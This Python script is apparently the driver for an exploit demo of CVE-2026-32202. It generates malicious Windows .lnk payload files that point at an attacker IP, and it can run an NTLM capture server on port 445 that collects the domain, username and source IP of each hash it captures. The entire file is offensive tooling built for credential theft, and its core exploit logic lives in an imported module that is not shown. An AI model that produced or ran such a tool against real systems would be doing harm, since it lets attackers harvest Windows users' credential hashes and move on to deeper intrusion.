#!/usr/bin/env python3
"""
Quick demo script for CVE-2026-32202

Generates .lnk files and optionally starts a capture server.

Usage:
  # Generate payloads only
  python quick_demo.py --attacker 192.168.1.100

  # Generate + start capture server
  python quick_demo.py --attacker 192.168.1.100 --capture

  # Full walkthrough
  python quick_demo.py --explain
"""

import sys
import os
sys.path.insert(0, os.path.dirname(__file__))

from cve_2026_32202 import CVE2026_32202_Demo, SCENARIOS
import argparse
import time
import threading


def main():
    p = argparse.ArgumentParser(description="CVE-2026-32202 Quick Demo")
    p.add_argument('--attacker', default='192.168.1.100')
    p.add_argument('--port', type=int, default=445)
    p.add_argument('--capture', action='store_true', help='Start capture server')
    p.add_argument('--explain', action='store_true', help='Show full explanation')
    args = p.parse_args()

    d = CVE2026_32202_Demo()

    if args.explain:
        d.print_attack_flow()
        for i in range(len(SCENARIOS)):
            d.print_scenario(i)
        return

    # Generate all .lnk payloads
    print("📝 Generating .lnk payloads...")
    files = d.generate_all_lnk(args.attacker)
    for f in files:
        print(f"   → {f}")

    if args.capture:
        print(f"\n🔓 Starting NTLM capture server on 0.0.0.0:{args.port}")
        print(f"   Copy .lnk files to a Windows system and observe hashes\n")
        server = d.start_capture_server('0.0.0.0', args.port)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
            n = len(server.captured)
            print(f"\n🔑 Captured {n} hash{'es' if n != 1 else ''}")
            for h in server.captured:
                print(f"   {h.domain}::{h.username} from {h.source_ip}")
    else:
        print("\n✅ Done. Use --capture to start a hash capture server.")
        print("   Use --explain for full attack flow and scenarios.")


if __name__ == "__main__":
    main()